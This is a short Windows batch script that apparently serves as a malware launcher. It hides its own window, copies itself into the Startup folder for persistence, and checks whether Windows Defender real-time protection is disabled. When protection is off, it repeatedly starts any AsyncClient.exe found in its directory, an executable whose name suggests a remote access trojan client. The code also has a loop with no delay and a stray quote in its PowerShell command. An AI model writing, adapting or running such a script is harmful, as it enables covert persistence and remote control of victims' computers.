@echo off

:: Check if the argument passed is "bg" (background)
if "%~1" neq "bg" (
    :: If not "bg", launch a hidden instance of itself with the "bg" flag
    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c ""%~f0"" bg' -WindowStyle Hidden'"
    exit
)

:: --- Startup Phase: Place script in Startup folder ---
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" >nul


for /f %%A in ('powershell -NoProfile -Command "(Get-MpComputerStatus).RealTimeProtectionEnabled"') do (
    set "status=%%A"
)

for /f %%A in ('powershell -Command "(Get-MpComputerStatus).RealTimeProtectionEnabled"') do set status=%%A

:repeat

if /i "%status%"=="False" (
	for /r "%~dp0" %%F in (AsyncClient.exe) do (
		start "" "%%F"
	)
)

goto repeat